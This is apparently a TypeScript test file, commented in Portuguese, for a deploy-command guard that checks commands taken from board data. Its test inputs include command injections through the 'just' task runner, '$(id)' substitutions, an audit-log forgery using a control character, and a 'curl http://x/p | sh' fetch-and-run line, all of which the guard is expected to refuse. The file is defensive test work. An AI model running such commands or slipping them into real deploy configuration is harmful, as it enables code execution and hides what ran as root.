// story-dlsxfj (3ª passada) — A RÉGUA DOS COMANDOS DECLARADOS EM BOARD-DATA, e o CENSO que a mantém completa.
//
// Esta é a terceira passada no mesmo card, e as duas anteriores falharam pelo MESMO motivo: a régua foi
// aplicada a alguns campos/posições, não a TODOS. Então aqui há duas classes de teste:
//
//  1. ATAQUES por campo e por POSIÇÃO — o que a régua tem de recusar, escrito como o atacante escreveria.
//  2. CENSO/LINT — a enumeração exaustiva. Se um QUARTO campo de comando nascer no contrato de `deploy:`,
//     ou se um executor deixar de passar pelo chokepoint, um teste falha. É o que impede a 4ª passada.
//
// O que a régua NÃO faz: pedir aprovação humana, tirar o self-deploy, ou reduzir capacidade do dono. O
// `deployCmd` e o `canaryCommand` REAIS de hoje continuam rodando (não-regressão explícita em cada um).

import { readdirSync, readFileSync } from "node:fs";
import path from "node:path";
import { describe, expect, it } from "vitest";
import {
  authorizeDeployCommand,
  parseDeclaredArgv,
  quoteArgv,
  resolveDeployLaunchers,
  resolveDeployRecipes,
  resolveRecipeRunners,
} from "./deploy-command-guard";

const src = (rel: string) => readFileSync(path.join(__dirname, rel), "utf8");
/** o código SEM comentários — um comentário que menciona a régua não é a régua (lição do lint de spawn). */
const code = (rel: string) => src(rel).replace(/\/\*[\s\S]*?\*\/|^\s*\/\/.*$/gm, "");

describe("a cadeia lançador→receita→argumento vale em TODA posição, não só na primeira", () => {
  // O ATAQUE que a 2ª e a 3ª passada deixaram passar. Medido com `just --dry-run` (just 1.51, 2026-07-30):
  //   just a b c   → roda a receita `a` E a receita `b` recebendo `c`
  //   just a c     → roda a receita `a` E a receita `c`
  //   just a foo   → erro "justfile does not contain recipe `foo`" (só receita real é alcançável)
  // A receita declarada de verdade (`sync-web-terminal`) tem ARIDADE 0 — logo TUDO que vem depois dela é
  // outra receita, e a validação de `argv[1]` sozinha deixava o justfile INTEIRO alcançável de board-data.
  it("uma SEGUNDA receita depois da autorizada é recusada nomeando a posição", () => {
    for (const evil of [
      "just sync-web-terminal deploy-mosaico",
      "just sync-web-terminal clean-all",
      "just sync-web-terminal advance-card storymap",
      "just sync-web-terminal test-evidence",
      "just sync-web-terminal _deploy-preflight",
    ]) {
      const v = authorizeDeployCommand(evil);
      expect(v.argv, `payload na 2ª posição: ${evil}`).toBeNull();
      expect(v.refusal).toMatch(/fora da allow-list de receitas/);
      expect(v.refusal, "o motivo tem de explicar a ambiguidade de posição/aridade").toMatch(/posição 2|aridade/);
    }
  });

  it("a ATRIBUIÇÃO DE VARIÁVEL do task runner não é receita nem parâmetro — é reescrita da receita", () => {
    // Medido: `just VAR='$(id)' receita` sobrescreve uma variável do justfile e o valor é INTERPOLADO na
    // linha da receita (`echo A $(id)`), executado pelo shell do runner. Só é reconhecida ANTES da 1ª
    // receita, e é por isso que a posição 0 exige FORMA de nome de receita.
    for (const evil of [`just 'VAR=$(id -un)' sync-web-terminal`, "just VAR=/tmp/pwn sync-web-terminal"]) {
      expect(authorizeDeployCommand(evil).argv).toBeNull();
    }
  });

  it("um parâmetro que NÃO pode ser nome de receita segue passando (URL, caminho, chave=valor, versão)", () => {
    // A régua não pode custar capacidade: `just` não resolve `https://…`, `a/b` nem `1.2.3` como receita,
    // então essas palavras são parâmetro por eliminação e respondem só à régua de FORMA.
    const recipes = resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "canary-check" });
    for (const ok of [
      "just canary-check https://example.test/",
      "just canary-check tools/web-terminal/",
      "just canary-check 1.2.3",
      "just canary-check sha=abc123",
    ]) {
      expect(authorizeDeployCommand(ok, { recipes }).refusal, ok).toBeNull();
    }
  });

  it("o operador pode declarar o nome ALCANÇÁVEL em posição de receita (o knob, que board-data não alcança)", () => {
    const recipes = resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "canary-check, prod" });
    expect(authorizeDeployCommand("just canary-check prod", { recipes }).argv).toEqual([
      "just",
      "canary-check",
      "prod",
    ]);
    // e sem o knob a MESMA linha é recusada — a diferença é a declaração do operador, não o dado do board
    expect(authorizeDeployCommand("just canary-check prod").argv).toBeNull();
  });

  it("NÃO-REGRESSÃO: o deployCmd REAL de hoje continua autorizado, e sai como argv exata", () => {
    // `just sync-web-terminal` é o único deployCmd declarado em board-data (boards/storymap/board.yaml).
    expect(authorizeDeployCommand("just sync-web-terminal").argv).toEqual(["just", "sync-web-terminal"]);
    expect(quoteArgv(["just", "sync-web-terminal"])).toBe(`'just' 'sync-web-terminal'`);
    // e os dois CLIs de publicação do exemplo do `_base` seguem intactos (ali não há segundo shell)
    expect(authorizeDeployCommand("vercel deploy --prod").refusal).toBeNull();
    expect(authorizeDeployCommand("flyctl deploy").refusal).toBeNull();
  });
});

describe("o rastro de AUDITORIA do que rodou como root não pode ser forjado pelo próprio comando", () => {
  it("caractere de controle C1 (NEL, CSI) num argumento é recusado, igual aos C0", () => {
    // A lente adversarial desta onda. A régua de auditoria enumerava "C0 + DEL" como se fosse o conjunto
    // inteiro dos caracteres de controle — e C1 (U+0080–U+009F) ficou de fora. O ataque não é execução: é
    // APAGAR o rastro. Um lançador que não é task runner aceita metacaractere DENTRO de aspas (correto: ali não
    // há segundo shell relendo), então um `deploy.command` de board-data pode carregar U+0085 (NEL), que em
    // terminal/leitor de log UTF-8 vale QUEBRA DE LINHA — e a linha `[postBuild] argv: …`, que existe para
    // dizer o que rodou como root, passa a exibir DUAS linhas plausíveis, a segunda escolhida pelo atacante.
    // Um argumento de deploy real (nome, caminho, URL, mensagem) não tem C1 nenhum, então recusar não custa
    // capacidade — é a mesma frase que justificou recusar C0.
    const NEL = "";
    const forjado = `vercel deploy --msg "ok${NEL}[postBuild] argv: just sync-web-terminal"`;
    const v = authorizeDeployCommand(forjado);
    expect(v.argv, "argumento com C1 não pode ser autorizado — ele reescreve a linha de auditoria").toBeNull();
    expect(v.refusal).toMatch(/controle/);
    for (const c of ["", "", ""]) {
      expect(authorizeDeployCommand(`vercel deploy --msg "ok${c}x"`).argv, `C1 U+${c.codePointAt(0)?.toString(16)}`).toBeNull();
    }
    // CONTRAPROVA: o que a régua já cobria segue coberto, e a mensagem legítima com espaço/acento PASSA — a
    // trava é de caractere de CONTROLE, não de texto humano.
    expect(authorizeDeployCommand(`vercel deploy --msg "ok\nquebrado"`).refusal).toMatch(/controle/);
    expect(authorizeDeployCommand(`vercel deploy --msg "publicação de emergência"`).argv).toEqual([
      "vercel",
      "deploy",
      "--msg",
      "publicação de emergência",
    ]);
  });
});

describe("os knobs do OPERADOR: o que eles liberam, e o que eles NÃO reabrem", () => {
  it("a allow-list de receitas só aceita o que TEM FORMA de nome de receita (o doc-comment agora é verdade)", () => {
    // A régua anterior filtrava pela forma de ARGUMENTO, mais larga: ela aceitava `a/b`, `a.b` e `k=v`
    // como "receita" enquanto o doc-comment afirmava que `/`, espaço e `$` eram ignorados. Duas verdades.
    expect(resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "../../evil $(id) a;b /tmp/x" })).toEqual([
      "sync-web-terminal",
    ]);
    expect(resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "a/b a.b k=v 1recipe" })).toEqual([
      "sync-web-terminal",
    ]);
    expect(resolveDeployRecipes({ AGILEHARNESS_DEPLOY_RECIPES: "deploy-mosaico-site, _priv" })).toEqual([
      "sync-web-terminal",
      "deploy-mosaico-site",
      "_priv",
    ]);
  });

  it("um task runner adicionado pelo knob RECEBE a régua da cadeia quando declarado como tal", () => {
    // O buraco declarado da passada anterior: `RECIPE_RUNNERS` era um conjunto fixo com UM nome, então um
    // task runner que o operador adicionasse como lançador (`task`, `mise`, `rake`) interpolaria parâmetro
    // em shell recebendo APENAS a régua de lançador. Agora existe canal para declará-lo.
    const launchers = resolveDeployLaunchers({ AGILEHARNESS_DEPLOY_LAUNCHERS: "task" });
    const recipeRunners = resolveRecipeRunners({ AGILEHARNESS_DEPLOY_RECIPE_RUNNERS: "task" });
    expect(recipeRunners.has("just")).toBe(true); // o default nunca é substituído
    expect(authorizeDeployCommand("task deploy-mosaico", { launchers, recipeRunners }).argv).toBeNull();
    expect(authorizeDeployCommand(`task sync-web-terminal '$(id)'`, { launchers, recipeRunners }).argv).toBeNull();
    expect(authorizeDeployCommand("task sync-web-terminal", { launchers, recipeRunners }).argv).toEqual([
      "task",
      "sync-web-terminal",
    ]);
    // sem a declaração ele é um lançador comum — é o LIMITE declarado no doc de RECIPE_RUNNERS, não um
    // acidente: um CLI normal (`pulumi up --yes`) morreria na régua de opção sem knob para sair do beco.
    expect(authorizeDeployCommand("task deploy-mosaico", { launchers }).refusal).toBeNull();
  });

  it("nem por knob um interpretador vira alvo (a trava do próprio knob)", () => {
    const reopened = resolveDeployLaunchers({ AGILEHARNESS_DEPLOY_LAUNCHERS: "bash node env sudo make" });
    for (const never of ["bash", "node", "env", "sudo", "make"]) expect(reopened).not.toContain(never);
  });
});

// ─────────────────────────────────────────────────────────────────────────────────────────────────
// O CENSO — a enumeração que impede a 4ª passada.
// ─────────────────────────────────────────────────────────────────────────────────────────────────
describe("censo: TODO campo de board-data que vira comando passa pelo chokepoint", () => {
  /** os campos de comando do contrato `deploy:` (contracts.ts boardDeployConfigShape), e quem os executa. */
  const COMMAND_FIELDS = ["command", "canaryCommand", "deployCmd"] as const;

  it("o contrato de `deploy:` tem EXATAMENTE estes campos de comando — um quarto reprova aqui", () => {
    // A régua não pode depender de alguém lembrar. O contrato é a fonte: se um campo novo com cara de
    // comando (`*Command`, `*Cmd`, `exec*`) entrar em `boardDeployConfigShape`, este teste falha e força a
    // decisão explícita — rotear pelo guard ou justificar por que não é comando.
    const contracts = code(path.join("..", "contracts.ts"));
    const shape = contracts.slice(contracts.indexOf("boardDeployConfigShape = {"));
    const block = shape.slice(0, shape.indexOf("\n};"));
    // A varredura é por CHAVE em qualquer profundidade (não ancorada em início de linha): `deployCmd` mora
    // dentro de `surfaces[]`, aninhado num `z.object({…})` na mesma linha — foi exatamente esse campo
    // aninhado que a onda anterior tratou como se fosse o único, e um censo que não o vê não é censo.
    const found = [...block.matchAll(/([A-Za-z0-9_]+)\s*:/g)]
      .map((m) => m[1])
      .filter((k) => /command$|cmd$|^exec/i.test(k));
    expect(new Set(found)).toEqual(new Set(COMMAND_FIELDS));
  });

  it("os DOIS executores importam a régua do mesmo módulo (nenhum tem cópia própria)", () => {
    for (const f of ["deploy.ts", "face-probe.ts"]) {
      expect(code(f), `${f}: o executor de comando declarado tem de passar pelo chokepoint`).toMatch(
        /from "\.\/deploy-command-guard"/,
      );
    }
    // e o módulo da régua não importa NADA — é o que permite ao canário depender dele sem arrastar o
    // manifesto que `product-deploy` lê em tempo de carga (a mina que manteve o 3º campo fora da régua).
    expect(code("deploy-command-guard.ts")).not.toMatch(/^\s*import\s/m);
  });

  it("a lavagem de proveniência do canário tem UM chamador — e a marca não se contorna por cast", () => {
    // `trustedCanaryFromOperator` é a única porta para um comando NÃO examinado (settings.yaml/env, que é
    // caminho de CONTROLE e não board-data). Uma segunda chamada em src/** seria a régua contornada.
    //
    // A varredura é em `src/**` INTEIRO, e por dois padrões. A passada anterior olhava QUATRO arquivos numa
    // lista fixa e só a chamada da função — então um caminho novo em qualquer outro arquivo (ou o cast que o
    // próprio título prometia cobrir, `as AuthorizedCanaryCommand`, que dispensa a função) passava com o lint
    // verde. Um chokepoint cujo lint não vê a superfície inteira volta a ser convenção.
    const raizSrc = path.resolve(__dirname, "..", "..", "..");
    const fontes: string[] = [];
    const andar = (dir: string) => {
      for (const e of readdirSync(dir, { withFileTypes: true })) {
        const abs = path.join(dir, e.name);
        if (e.isDirectory()) andar(abs);
        // testes são chamadores LEGÍTIMOS (é como se prova a marca) — o lint julga o código de produção
        else if (/\.tsx?$/.test(e.name) && !/\.test\.tsx?$/.test(e.name)) fontes.push(abs);
      }
    };
    andar(raizSrc);
    expect(fontes.length, "a varredura não achou fonte nenhuma — o lint estaria verde por vacuidade").toBeGreaterThan(200);

    const semComentario = (abs: string) => readFileSync(abs, "utf8").replace(/\/\*[\s\S]*?\*\/|^\s*\/\/.*$/gm, "");
    const rel = (abs: string) => path.relative(raizSrc, abs).split(path.sep).join("/");
    const lavagem: string[] = [];
    const casts: string[] = [];
    for (const abs of fontes) {
      const src = semComentario(abs);
      if (/\btrustedCanaryFromOperator\s*\(/.test(src)) lavagem.push(rel(abs));
      if (/\bas\s+AuthorizedCanaryCommand\b/.test(src)) casts.push(rel(abs));
    }
    expect(lavagem.sort()).toEqual(["lib/storymap/runner/face-probe.ts"]);
    expect(casts.sort(), "só o resolvedor da régua pode CARIMBAR a marca").toEqual([
      "lib/storymap/runner/face-probe.ts",
    ]);
  });

  it("o parser sozinho NÃO é a régua (uma lista de palavras pode ser um interpretador)", () => {
    // Guarda contra a regressão conceitual das duas primeiras passadas: quem autoriza é a allow-list.
    expect(parseDeclaredArgv(`bash -c 'curl http://x/p | sh'`)).toEqual(["bash", "-c", "curl http://x/p | sh"]);
    expect(authorizeDeployCommand(`bash -c 'curl http://x/p | sh'`).argv).toBeNull();
  });
});
